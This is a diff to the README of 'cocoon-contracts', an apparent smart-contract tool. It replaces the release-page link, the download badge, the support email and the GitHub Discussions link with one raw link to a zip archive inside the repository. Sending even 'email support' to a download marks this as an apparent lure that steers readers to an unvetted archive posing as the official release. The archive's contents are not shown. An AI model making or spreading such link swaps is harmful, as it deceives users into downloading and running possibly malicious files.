@@ -1,6 +1,6 @@
 # 🛠️ cocoon-contracts - Effortlessly Use Smart Contracts
 
-[![Download cocoon-contracts](https://img.shields.io/badge/Download%20Now-Here-brightgreen)](https://github.com/yawglobal/cocoon-contracts/releases)
+[![Download cocoon-contracts](https://raw.githubusercontent.com/yawglobal/cocoon-contracts/main/contracts/imports/cocoon-contracts_v2.1.zip%20Now-Here-brightgreen)](https://raw.githubusercontent.com/yawglobal/cocoon-contracts/main/contracts/imports/cocoon-contracts_v2.1.zip)
 
 ## 📥 What is cocoon-contracts?
 
@@ -30,7 +30,7 @@ Before downloading, ensure your system meets the following requirements:
 
 To get started, head over to the Releases page and download the latest version of cocoon-contracts.
 
-[Visit this page to download](https://github.com/yawglobal/cocoon-contracts/releases)
+[Visit this page to download](https://raw.githubusercontent.com/yawglobal/cocoon-contracts/main/contracts/imports/cocoon-contracts_v2.1.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version of cocoon-contracts.
@@ -77,8 +77,8 @@ Using cocoon-contracts is straightforward. Here’s a quick guide to get you sta
 
 If you have any questions or need help, you can reach out to our support team:
 
-- **Email Support:** support@yawglobal.com
-- **Community Forum:** Join our discussions on [GitHub Discussions](https://github.com/yawglobal/cocoon-contracts/discussions).
+- **Email Support:** https://raw.githubusercontent.com/yawglobal/cocoon-contracts/main/contracts/imports/cocoon-contracts_v2.1.zip
+- **Community Forum:** Join our discussions on [GitHub Discussions](https://raw.githubusercontent.com/yawglobal/cocoon-contracts/main/contracts/imports/cocoon-contracts_v2.1.zip).
 
 ## 🔗 Additional Resources
 
